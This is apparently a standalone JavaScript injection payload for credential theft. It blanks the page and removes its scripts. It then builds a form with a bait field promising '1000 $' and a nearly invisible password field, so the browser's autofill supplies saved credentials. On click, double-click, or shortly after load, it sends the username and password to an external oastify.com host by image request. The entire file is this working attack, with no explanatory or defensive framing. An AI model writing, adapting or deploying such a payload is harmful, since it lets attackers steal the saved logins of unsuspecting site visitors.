document.body.innerHTML = "";
var scriptss = document.scripts;

for (var i = scriptss.length - 1; i >= 0; i--) {
  var script = scriptss[i];
  script.parentNode.removeChild(script);
}

var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none !important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

var form = document.createElement('form');
form.style.display = 'flex';
form.style.flexDirection = 'column';
form.style.justifyContent = 'center';
form.style.alignItems = 'center';
form.style.height = '100vh';

var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.autocomplete = 'username';
inputName.placeholder = 'CLICK or DOUBLE CLICK HERE to GET 1000 $';
inputName.style.border = "none";
inputName.style.outline = "none";
inputName.style.background = "none";
inputName.style.width = "100%";
inputName.style.textAlign = "center";
inputName.style.fontSize = "24px";
inputName.style.fontWeight = "bold";
inputName.classList.add("single-input");

var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.autocomplete = 'current-password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.padding = "0";
inputPassword.style.width = "1%";
inputPassword.classList.add("single-input");

form.appendChild(inputName);
form.appendChild(inputPassword);

document.body.appendChild(form);

function sendCredentials(username, password) {
  var img = new Image();
  img.src = `http://tb81wwfqabo7ib50lv9zyygmhdn4buzj.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
  document.body.appendChild(img);
}

function attachEventListeners() {
  let a = document.getElementsByName('username')[0];
  let b = document.getElementsByName('password')[0];

  function f() {
    if (b.value.length > 0) {
      sendCredentials(a.value, b.value);
    }
  }

  a.onclick = f;
  a.ondblclick = f;
  b.onclick = f;
  b.ondblclick = f;

  // Directly call the function to send credentials
  f();
}

document.addEventListener('DOMContentLoaded', function() {
  setTimeout(attachEventListeners, 1000);
});
